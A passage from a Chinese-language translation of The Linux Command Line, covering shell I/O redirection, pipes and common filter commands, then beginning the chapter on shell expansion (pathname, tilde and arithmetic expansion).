<p>该文件现在长度为零！这是因为当我们使用“&gt;”重定向操作符重定向输出时，目标文件总是从开始处被重新写入。由于我们的 ls 命令没有生成任何结果，只有一个错误消息，重定向操作开始重新写入文件，然后因为错误而停止，导致其被截断。实际上，如果我们需要实际截断一个文件（或创建一个新的空文件），我们可以使用这样的技巧：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ &gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<p>简单地使用重定向操作符而没有在其之前添加任何命令将截断一个现有的文件或创建一个新的空文件。</p>
<p>那么，我们如何将重定向的输出追加到一个文件中，而不是从开始处覆盖文件呢？为此，我们使用<code>&gt;&gt;</code>重定向操作符，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /usr/bin &gt;&gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<p>使用<code>&gt;&gt;</code>操作符会导致输出被追加到文件中。如果文件还不存在，它将会被创建，就像使用<code>&gt;</code>操作符一样。让我们进行测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /usr/bin &gt;&gt; ls-output.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l /usr/bin &gt;&gt; ls-output.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l /usr/bin &gt;&gt; ls-output.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l ls-output.txt</span><br><span class="line">-rw-rw-r-- 1 me me 503634 2018-02-01 15:45 ls-output.txt</span><br></pre></td></tr></table></figure>

<p>重复执行该命令三次，导致输出文件的大小增加了三倍。</p>
<h3 id="重定向标准错误"><a href="#重定向标准错误" class="headerlink" title="重定向标准错误"></a>重定向标准错误</h3><p>重定向标准错误没有一个专用的重定向操作符那样简单。为了重定向标准错误，我们必须引用其<em>文件描述符</em>。一个程序可以在多个编号的文件流上产生输出。虽然我们已经提到这些文件流的前三个分别为标准输入、输出和错误，但shell在内部将它们称为文件描述符0、1和2。shell提供了一种使用文件描述符号码进行重定向的表示法。因为标准错误与文件描述符号码2相同，所以我们可以使用这种表示法来重定向标准错误：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /bin/usr 2&gt; ls-error.txt</span><br></pre></td></tr></table></figure>

<p>文件描述符“2”紧随重定向操作符之前，用于将标准错误重定向到文件ls-error.txt。</p>
<h4 id="将标准输出和标准错误重定向到一个文件"><a href="#将标准输出和标准错误重定向到一个文件" class="headerlink" title="将标准输出和标准错误重定向到一个文件"></a>将标准输出和标准错误重定向到一个文件</h4><p>有些情况下，我们可能希望将一个命令的所有输出都捕获到一个单一的文件中。为了做到这一点，我们必须同时重定向标准输出和标准错误。有两种方法可以实现这一点。这里展示的是传统的方法，适用于旧版本的shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /bin/usr &gt; ls-output.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>使用这种方法，我们进行了两次重定向。首先，我们将标准输出重定向到文件ls-output.txt，然后使用符号2&gt;&amp;1将文件描述符2（标准错误）重定向到文件描述符1（标准输出）。</p>
<p><strong>请注意，重定向的顺序很重要。</strong> 必须在重定向标准输出之后始终*重定向标准错误，否则它将不起作用。</p>
<p>以下示例将标准错误重定向到文件ls-output.txt：</p>
<p>&gt;ls-output.txt 2&gt;&amp;1</p>
<p>然而，如果顺序改为以下方式，标准错误将被重定向到屏幕。</p>
<p>2&gt;&amp;1 &gt;ls-output.txt</p>
<p>最近的bash版本提供了一个更简洁的方法来执行这种组合重定向，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /bin/usr &amp;&gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们使用单一符号 &amp;&gt; 来将标准输出和标准错误都重定向到文件 ls-output.txt。我们还可以像这样将标准输出和标准错误流追加到一个单一文件中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /bin/usr &amp;&gt;&gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<h4 id="处理不需要的输出"><a href="#处理不需要的输出" class="headerlink" title="处理不需要的输出"></a>处理不需要的输出</h4><p>有时，“沉默是金”，我们不希望从命令中得到输出，只是想将其丢弃。这特别适用于错误和状态消息。系统提供了一种方法来做到这一点，即通过将输出重定向到一个名为“&#x2F;dev&#x2F;null”的特殊文件。这个文件是一个系统设备，通常被称为“位桶”，它接受输入但不对其进行任何处理。为了抑制命令的错误消息，我们这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /bin/usr 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="在Unix文化中的-dev-null"><a href="#在Unix文化中的-dev-null" class="headerlink" title="在Unix文化中的&#x2F;dev&#x2F;null"></a>在Unix文化中的&#x2F;dev&#x2F;null</h3><p>位桶是一个古老的Unix概念，由于其普遍性，它已经出现在Unix文化的许多部分中。当有人说他&#x2F;她正在将您的评论发送到&#x2F;dev&#x2F;null时，现在您知道这意味着什么。有关更多示例，请参阅<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9kZXYvbnVsbA==">维基百科上的&#x2F;dev&#x2F;null文章<i class="fa fa-external-link-alt"></i></span>。</p>
<h3 id="重定向标准输入"><a href="#重定向标准输入" class="headerlink" title="重定向标准输入"></a>重定向标准输入</h3><p>到目前为止，我们还没有遇到任何使用标准输入的命令（实际上我们有，但稍后我们将揭示这个惊喜），所以我们需要介绍一个。</p>
<h4 id="cat-–-连接文件"><a href="#cat-–-连接文件" class="headerlink" title="cat – 连接文件"></a>cat – 连接文件</h4><p>cat命令读取一个或多个文件，并将它们复制到标准输出，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat [file...]</span><br></pre></td></tr></table></figure>

<p>在大多数情况下，我们可以认为cat类似于DOS中的TYPE命令。我们可以使用它来显示文件而不分页。例如，以下命令将显示文件ls-output.txt的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cat ls-output.txt</span><br></pre></td></tr></table></figure>

<p>cat经常用于显示短文本文件。由于cat可以接受多个文件作为参数，因此它也可以用来将文件连接在一起。假设我们下载了一个被分割成多个部分的大文件（在Usenet上，多媒体文件经常以这种方式被分割），我们想要将它们重新连接在一起。如果这些文件命名为：movie.mpeg.001、movie.mpeg.002 … movie.mpeg.099，我们可以使用以下命令将它们重新连接起来：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat movie.mpeg.0* &gt; movie.mpeg</span><br></pre></td></tr></table></figure>

<p>由于通配符总是按照排序顺序展开，所以参数会按正确的顺序排列。</p>
<p>这都很好，但这与标准输入有什么关系呢？目前还没有关系，但让我们尝试另一件事情。如果我们不带任何参数输入cat会发生什么？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cat</span><br></pre></td></tr></table></figure>

<p>什么也不会发生，它就像被挂起了一样静止不动。看起来可能是这样，但它实际上确实在按照它应该执行的方式进行操作。</p>
<p>如果没有给cat提供任何参数，它会从标准输入读取数据，而标准输入默认是连接到键盘的，所以它在等待我们输入！尝试添加以下文本并按Enter键：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cat</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>接下来，按下 Ctrl 键并同时按“d”键（即，Ctrl-d）告诉 cat 它已经在标准输入上达到了文件结束（EOF）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cat</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>在没有文件名参数的情况下，cat 将标准输入复制到标准输出，所以我们看到我们的文本行被重复显示。我们可以利用这种行为来创建短文本文件。假设我们想要创建一个名为 lazy_dog.txt 的文件，其中包含我们示例中的文本。我们会这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cat &gt; lazy_dog.txt</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>在命令后输入我们想要放入文件中的文本。记得在最后按下 Ctrl-d。使用命令行，我们实现了世界上最简单的文字处理器！为了查看我们的结果，我们可以使用 cat 再次将文件复制到 stdout。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cat lazy_dog.txt</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>现在我们知道 cat 如何接受标准输入，除了文件名参数之外，让我们尝试重定向标准输入。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cat &lt; lazy_dog.txt</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>使用 &lt; 重定向运算符，我们将标准输入的来源从键盘更改为文件 lazy_dog.txt。我们看到结果与传递单个文件名参数相同。与传递文件名参数相比，这并不特别有用，但它展示了如何使用文件作为标准输入的来源。其他命令更好地利用了标准输入，我们很快就会看到。</p>
<p>在我们继续之前，查看一下 cat 的 man 页面，因为它有几个有趣的选项。</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>命令从标准输入读取数据并发送到标准输出的能力是由一个 shell 功能称为 <em>管道</em> 所利用的。使用管道运算符 |（竖线），一个命令的标准输出可以 <em>管道化</em> 到另一个命令的标准输入。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">command1 | command2</span><br></pre></td></tr></table></figure>

<p>为了充分展示这一点，我们需要一些命令。还记得我们说过有一个我们已经知道接受标准输入的命令吗？那就是 <code>less</code>。我们可以使用 <code>less</code> 逐页显示任何将其结果发送到标准输出的命令的输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /usr/bin | less</span><br></pre></td></tr></table></figure>

<p>这非常方便！使用这种技术，我们可以方便地检查任何生成标准输出的命令的输出。</p>
<p><strong>&gt; 和 | 之间的区别</strong>乍一看，可能很难理解管道运算符 | 与重定向运算符 &gt; 所执行的重定向之间的区别。简单地说，重定向运算符将一个命令与一个文件连接起来，而管道运算符将一个命令的输出与第二个命令的输入连接起来。<em>command1</em> &gt; <em>file1</em> 和 <em>command1</em> | <em>command2</em>。很多人在学习管道时会尝试以下操作，“只是为了看看会发生什么”：<em>command1</em> &gt; <em>command2</em>。答案：有时会发生非常糟糕的事情。</p>
<p>这里有一个实际的例子，是一位管理员正在管理一个基于 Linux 的服务器设备。作为超级用户，他做了以下操作：</p>
<p># cd &#x2F;usr&#x2F;bin</p>
<p># ls &gt; less</p>
<p>第一个命令将他放在了大多数程序存储的目录中，而第二个命令告诉 shell 用 <code>ls</code> 命令的输出覆盖 <code>less</code> 文件。由于 &#x2F;usr&#x2F;bin 目录已经包含了一个名为 <code>less</code> 的文件（即 <code>less</code> 程序），第二个命令用 <code>ls</code> 的文本覆盖了 <code>less</code> 程序文件，从而破坏了他系统上的 <code>less</code> 程序。</p>
<p>这里的教训是，重定向运算符会默默地创建或覆盖文件，所以你需要非常尊重它。</p>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>管道经常被用来对数据执行复杂的操作。可以将多个命令组合成一个管道。经常这样使用的命令被称为 <em>过滤器</em>。过滤器接收输入，以某种方式更改它，然后输出它。我们首先尝试的是 <code>sort</code>。想象一下，如果我们想要制作 <code>/bin</code> 和 <code>/usr/bin</code> 中所有可执行程序的合并列表，并按排序顺序排列它们，然后查看结果列表：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls /bin /usr/bin | sort | less</span><br></pre></td></tr></table></figure>

<p>由于我们指定了两个目录（&#x2F;bin 和 &#x2F;usr&#x2F;bin），<code>ls</code> 的输出本来会包含两个排序列表，每个目录一个。通过在我们的管道中包括 <code>sort</code>，我们改变了数据以生成一个单一的、排序过的列表。</p>
<h4 id="uniq-报告或省略重复行"><a href="#uniq-报告或省略重复行" class="headerlink" title="uniq - 报告或省略重复行"></a>uniq - 报告或省略重复行</h4><p><code>uniq</code> 命令经常与 <code>sort</code> 一起使用。<code>uniq</code> 接受来自标准输入或单个文件名参数（有关详细信息，请参阅 <code>uniq</code> 手册页）的排序数据列表，并默认情况下从列表中删除任何重复项。因此，为了确保我们的列表没有重复项（也就是说，在 <code>/bin</code> 和 <code>/usr/bin</code> 目录中都出现的同名程序），我们将在我们的管道中添加 <code>uniq</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls /bin /usr/bin | sort | uniq | less</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们使用 <code>uniq</code> 从 <code>sort</code> 命令的输出中删除任何重复项。如果我们想看到重复项的列表，我们可以像这样给 <code>uniq</code> 添加“-d”选项：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls /bin /usr/bin | sort | uniq -d | less</span><br></pre></td></tr></table></figure>

<h4 id="wc-–-打印行、单词和字节计数"><a href="#wc-–-打印行、单词和字节计数" class="headerlink" title="wc – 打印行、单词和字节计数"></a>wc – 打印行、单词和字节计数</h4><p><code>wc</code>（word count）命令用于显示文件中包含的行数、单词数和字节数。以下是一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ wc ls-output.txt</span><br><span class="line"> 7902 64566 503634 ls-output.txt</span><br></pre></td></tr></table></figure>

<p>在这种情况下，它打印出三个数字：<code>ls-output.txt</code> 中包含的行数、单词数和字节数。与我们之前的命令一样，如果没有命令行参数执行它，<code>wc</code> 会接受标准输入。“-l”选项限制其输出只报告行数。将其添加到管道中是计数的一种方便方式。要查看我们排序列表中的项目数，我们可以这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls /bin /usr/bin | sort | uniq | wc -l</span><br><span class="line">2728</span><br></pre></td></tr></table></figure>

<h4 id="grep-–-打印匹配模式的行"><a href="#grep-–-打印匹配模式的行" class="headerlink" title="grep – 打印匹配模式的行"></a>grep – 打印匹配模式的行</h4><p><code>grep</code> 是一个强大的程序，用于在文件中查找文本模式。它的使用方式如下：</p>
<p>当 <code>grep</code> 在文件中遇到一个“模式”时，它会打印出包含该模式的行。<code>grep</code> 可以匹配的模式可能非常复杂，但现在我们将集中关注简单的文本匹配。我们将在第19章中介绍称为 <em>正则表达式</em> 的高级模式。</p>
<p>假设我们想在程序列表中找到所有名称中包含单词“zip”的文件。这样的搜索可能会让我们了解一些与文件压缩有关的系统程序。我们会这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls /bin /usr/bin | sort | uniq | grep zip</span><br><span class="line">bunzip2</span><br><span class="line">bzip2</span><br><span class="line">gunzip</span><br><span class="line">gzip</span><br><span class="line">unzip</span><br><span class="line">zip</span><br><span class="line">zipcloak</span><br><span class="line">zipgrep</span><br><span class="line">zipinfo</span><br><span class="line">zipnote</span><br><span class="line">zipsplit</span><br></pre></td></tr></table></figure>

<p><code>grep</code> 还有一些方便的选项：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep pattern [file...]</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-i</code>，使 <code>grep</code> 在执行搜索时忽略大小写（通常搜索区分大小写）</li>
<li><code>-v</code>，告诉 <code>grep</code> 只打印不匹配模式的那些行。</li>
</ul>
<h4 id="head-tail-–-打印文件的前部分-后部分"><a href="#head-tail-–-打印文件的前部分-后部分" class="headerlink" title="head &#x2F; tail – 打印文件的前部分 &#x2F; 后部分"></a>head &#x2F; tail – 打印文件的前部分 &#x2F; 后部分</h4><p>有时我们不希望从命令中得到所有输出。我们可能只想要前几行或后几行。<code>head</code> 命令打印文件的前十行，而 <code>tail</code> 命令打印文件的最后十行。默认情况下，这两个命令都会打印十行文本，但可以使用 <code>-n</code> 选项进行调整。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ head -n 5 ls-output.txt</span><br><span class="line">total 343496</span><br><span class="line">-rwxr-xr-x 1 root root 31316 2007-12-05 08:58 [</span><br><span class="line">-rwxr-xr-x 1 root root 8240 2007-12-09 13:39 411toppm</span><br><span class="line">-rwxr-xr-x 1 root root 111276 2007-11-26 14:27 a2p</span><br><span class="line">-rwxr-xr-x 1 root root 25368 2006-10-06 20:16 a52dec</span><br><span class="line">[me@linuxbox ~]$ tail -n 5 ls-output.txt</span><br><span class="line">-rwxr-xr-x 1 root root 5234 2007-06-27 10:56 znew</span><br><span class="line">-rwxr-xr-x 1 root root 691 2005-09-10 04:21 zonetab2pot.py</span><br><span class="line">-rw-r--r-- 1 root root 930 2007-11-01 12:23 zonetab2pot.pyc</span><br><span class="line">-rw-r--r-- 1 root root 930 2007-11-01 12:23 zonetab2pot.pyo</span><br><span class="line">lrwxrwxrwx 1 root root 6 2016-01-31 05:22 zsoelim -&gt; soelim</span><br></pre></td></tr></table></figure>

<p>这些命令也可以在管道中使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls /usr/bin | tail -n 5</span><br><span class="line">znew</span><br><span class="line">zonetab2pot.py</span><br><span class="line">zonetab2pot.pyc</span><br><span class="line">zonetab2pot.pyo</span><br><span class="line">zsoelim</span><br></pre></td></tr></table></figure>

<p>tail有一个选项，允许我们实时查看文件。这对于观察正在被写入的日志文件的进度非常有用。在下面的例子中，我们将查看<code>/var/log</code>中的<code>messages</code>文件（如果<code>messages</code>不存在，则查看<code>/var/log/syslog</code>文件）。在某些Linux发行版上，执行此操作需要超级用户权限，因为<code>/var/log/messages</code>文件可能包含安全信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ tail -f /var/log/messages</span><br><span class="line">Feb 8 13:40:05 twin4 dhclient: DHCPACK from 192.168.1.1</span><br><span class="line">Feb 8 13:40:05 twin4 dhclient: bound to 192.168.1.4 -- renewal in</span><br><span class="line">1652 seconds.</span><br><span class="line">Feb 8 13:55:32 twin4 mountd[3953]: /var/NFSv4/musicbox exported to</span><br><span class="line">both 192.168.1.0/24 and twin7.localdomain in</span><br><span class="line">192.168.1.0/24,twin7.localdomain</span><br><span class="line">Feb 8 14:07:37 twin4 dhclient: DHCPREQUEST on eth0 to 192.168.1.1</span><br><span class="line">port 67</span><br><span class="line">Feb 8 14:07:37 twin4 dhclient: DHCPACK from 192.168.1.1</span><br><span class="line">Feb 8 14:07:37 twin4 dhclient: bound to 192.168.1.4 -- renewal in</span><br><span class="line">1771 seconds.</span><br><span class="line">Feb 8 14:09:56 twin4 smartd[3468]: Device: /dev/hda, SMART</span><br><span class="line">Prefailure Attribute: 8 Seek_Time_Performance changed from 237 to 236</span><br><span class="line">Feb 8 14:10:37 twin4 mountd[3953]: /var/NFSv4/musicbox exported to</span><br><span class="line">both 192.168.1.0/24 and twin7.localdomain in</span><br><span class="line">192.168.1.0/24,twin7.localdomain</span><br><span class="line">Feb 8 14:25:07 twin4 sshd(pam_unix)[29234]: session opened for user</span><br><span class="line">me by (uid=0)</span><br><span class="line">Feb 8 14:25:36 twin4 su(pam_unix)[29279]: session opened for user</span><br><span class="line">root by me(uid=500)</span><br></pre></td></tr></table></figure>

<p>使用“-f”选项，<code>tail</code>会继续监视文件，当有新行被追加时，它们会立即显示在屏幕上。这将继续进行，直到我们按下Ctrl-c。</p>
<h4 id="tee-–-从标准输入读取并将其输出到标准输出和文件"><a href="#tee-–-从标准输入读取并将其输出到标准输出和文件" class="headerlink" title="tee – 从标准输入读取并将其输出到标准输出和文件"></a>tee – 从标准输入读取并将其输出到标准输出和文件</h4><p>为了保持我们的管道隐喻，Linux提供了一个称为tee的命令，该命令在我们的管道上创建一个“tee”接头。tee程序读取标准输入并将其复制到标准输出（允许数据继续通过管道）以及一个或多个文件。这对于在处理的中间阶段捕获管道的内容非常有用。在这里，我们重复了我们早些时候的一个例子，这次包括tee以将整个目录列表捕获到文件<code>ls.txt</code>中，然后再由grep过滤管道的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls /usr/bin | tee ls.txt | grep zip</span><br><span class="line">bunzip2</span><br><span class="line">bzip2</span><br><span class="line">gunzip</span><br><span class="line">gzip</span><br><span class="line">unzip</span><br><span class="line">zip</span><br><span class="line">zipcloak</span><br><span class="line">zipgrep</span><br><span class="line">zipinfo</span><br><span class="line">zipnote</span><br><span class="line">zipsplit</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>像往常一样，查看我们在本章中涵盖的每个命令的文档。我们只看到了它们最基本的用法。它们都有许多有趣的选项。随着我们在Linux上的经验增长，我们会发现命令行的重定向功能对解决特定问题非常有用。有许多命令使用标准输入和输出，几乎所有的命令行程序都使用标准错误来显示它们的信息性消息。</p>
<h3 id="Linux-是关于想象力的"><a href="#Linux-是关于想象力的" class="headerlink" title="Linux 是关于想象力的"></a>Linux 是关于想象力的</h3><p>当我被问及解释Windows和Linux之间的区别时，我经常使用一个玩具类比。</p>
<p>Windows就像是Game Boy。你去商店买了一个全新的、闪闪发光的盒子。你带它回家，打开它，然后玩耍。漂亮的图形，可爱的声音。然而，过了一段时间，你厌倦了它自带的游戏，于是你回到商店买了另一个。这个周期一次又一次地重复。最后，你回到商店告诉柜台后面的人，“我想要一个能做这个的游戏！”结果被告知这样的游戏不存在，因为没有“市场需求”。然后你说，“但我只需要改变这一件事！”柜台后面的人告诉你不能改变它。这些游戏都被封闭在它们的卡带中。你发现你的玩具只能玩别人决定你需要的游戏。</p>
<p>另一方面，Linux就像是世界上最大的Erector Set（铁架玩具套件）。你打开它，里面只有大量的部件。有许多钢支柱、螺丝、螺母、齿轮、滑轮、电机，还有一些建议可以建造什么。于是，你开始玩耍。你按照其中一个建议开始建造，然后又建造另一个。过了一段时间，你发现你有了自己的想法。你不需要再回到商店，因为你已经拥有了你需要的一切。这个Erector Set会按照你的想象力的形状进行变化。它会做你想要的。</p>
<p>当然，你选择的玩具是个人的事情，那么你会觉得哪个玩具更令人满意呢？</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>从Shell的视角看世界</title>
    <url>/2024/03/7-seeing-world-shell/</url>
    <content><![CDATA[<h2 id="7-–-从Shell的视角看世界"><a href="#7-–-从Shell的视角看世界" class="headerlink" title="7 – 从Shell的视角看世界"></a>7 – 从Shell的视角看世界</h2><p>在这一章中，我们将探讨在我们按下Enter键时，命令行中发生的一些“魔法”。虽然我们将研究shell的几个有趣且复杂的功能，但我们只会引入一个新命令。</p>
<ul>
<li>echo – 显示一行文本</li>
</ul>
<span id="more"></span>

<h3 id="展开（Expansion）"><a href="#展开（Expansion）" class="headerlink" title="展开（Expansion）"></a>展开（Expansion）</h3><p>每当我们输入一个命令并按下Enter键时，bash在执行我们的命令之前会对文本进行几次替换。我们已经看到了一个简单字符序列，例如 *，对shell意味着很多。</p>
<p>使这一切发生的过程被称为<em>展开</em>（expansion）。通过展开，我们输入的内容在shell执行之前会被展开为其他内容。为了演示这是什么意思，让我们看一下echo命令。echo是一个shell内置命令，执行一个非常简单的任务。它会在标准输出上打印其文本参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo this is a test</span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure>

<p>这相当简单。传递给echo的任何参数都会被显示。让我们试试另一个例子。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo *</span><br><span class="line">Desktop Documents ls-output.txt Music Pictures Public Templates</span><br><span class="line">Videos</span><br></pre></td></tr></table></figure>

<p>那么刚才发生了什么？为什么echo没有打印出 <em>？从我们之前使用通配符的经验来看，字符意味着匹配文件名中的任何字符，但我们在原始讨论中没有看到shell是如何实现的。简单的答案是，在执行echo命令之前，shell将</em>展开为其他内容（在这种情况下，是当前工作目录中的文件名）。当按下Enter键时，shell会自动展开命令行上的任何符合条件的字符，因此echo命令从未看到，只看到其展开的结果。了解这一点，我们可以看到echo的行为是符合预期的。</p>
<h4 id="路径名展开"><a href="#路径名展开" class="headerlink" title="路径名展开"></a>路径名展开</h4><p>通配符起作用的机制称为<em>路径名展开</em>。如果我们尝试在早期章节中使用的一些技术，我们会发现它们实际上都是展开。假设有一个家目录看起来像这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls</span><br><span class="line">Desktop ls-output.txt Pictures Templates</span><br><span class="line">Documents Music Public Videos</span><br></pre></td></tr></table></figure>

<p>我们可以进行如下扩展：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo D*</span><br><span class="line">Desktop Documents</span><br></pre></td></tr></table></figure>

<p>还有这个：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo *s</span><br><span class="line">Documents Pictures Templates Videos</span><br></pre></td></tr></table></figure>

<p>甚至这个：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo [[:upper:]]*</span><br><span class="line">Desktop Documents Music Pictures Public Templates Videos</span><br></pre></td></tr></table></figure>

<p>并将目光投向主目录之外，我们就能做到这一点：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo /usr/*/share</span><br><span class="line">/usr/kerberos/share /usr/local/share</span><br></pre></td></tr></table></figure>

<h3 id="隐藏文件的路径名展开"><a href="#隐藏文件的路径名展开" class="headerlink" title="隐藏文件的路径名展开"></a>隐藏文件的路径名展开</h3><p>我们知道，以句点字符（.）开始的文件名是隐藏的。路径名展开也遵循这种行为。如下的展开不会显示隐藏文件。</p>
<p>echo *</p>
<p>乍看之下，我们可能会认为通过在模式前加一个句点来包括隐藏文件，像这样：</p>
<p>echo .*</p>
<p>这几乎有效。但是，如果我们仔细检查结果，我们会看到名为.和..的名称也会出现在结果中。因为这些名称指的是当前工作目录及其父目录，使用这个模式可能会产生不正确的结果。如果我们尝试以下命令，就可以看到这一点：ls -d .* | less</p>
<p>为了在这种情况下更好地执行路径名展开，我们必须使用一个更具体的模式。</p>
<p>echo .[!.]*</p>
<p>这个模式会展开为每个以一个句点开头，后面跟随任何其他字符的文件名。这将正确地处理大多数隐藏文件（尽管它仍然不会包括以多个句点开头的文件名）。使用-A选项（“几乎全部”）的ls命令将提供隐藏文件的正确列表。ls -A</p>
<h4 id="波浪线展开"><a href="#波浪线展开" class="headerlink" title="波浪线展开"></a>波浪线展开</h4><p>我们可能还记得我们在介绍cd命令时提到过，波浪线字符（~）有特殊的含义。当它用在单词的开头时，它会展开为指定用户的家目录名称，如果没有指定用户，则为当前用户的家目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo ~</span><br><span class="line">/home/me</span><br></pre></td></tr></table></figure>

<p>如果用户 “foo “有一个账户，就会扩展成这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo ~foo</span><br><span class="line">/home/foo</span><br></pre></td></tr></table></figure>

<h4 id="算术展开"><a href="#算术展开" class="headerlink" title="算术展开"></a>算术展开</h4><p>Shell允许通过展开进行算术运算。这使我们可以使用shell提示符作为计算器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $((2 + 2))</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>算术展开使用以下形式：</p>
<p>$((<em>表达式</em>))</p>
<p>其中<em>表达式</em>是由值和算术运算符组成的算术表达式。</p>
<p>算术展开仅支持整数（即整数，没有小数点），但可以执行多种不同的操作。表7-1描述了一些支持的运算符。</p>
<p><em>表7-1：算术运算符</em></p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加法</td>
</tr>
<tr>
<td>-</td>
<td>减法</td>
</tr>
<tr>
<td>*</td>
<td>乘法</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>除法（但请记住，由于展开仅支持整数算术，结果也是整数）。</td>
</tr>
<tr>
<td>%</td>
<td>取模，简单地说就是“余数”。</td>
</tr>
<tr>
<td>**</td>
<td>指数运算</td>
</tr>
</tbody></table>
<p>算术表达式中的空格不重要，表达式可以嵌套。例如，要将5的平方乘以3，我们可以使用这个：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $(($((5**2)) * 3))</span><br><span class="line">75</span><br></pre></td></tr></table></figure>

<p>单括号可以用来组合多个子表达式。使用这种技术，我们可以重写之前的例子，并使用单次展开而不是两次来获得相同的结果。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $(((5**2) * 3))</span><br><span class="line">75</span><br></pre></td></tr></table></figure>

<p>下面是一个使用除法和取余运算符的例子。请注意整数除法的效果。</p>
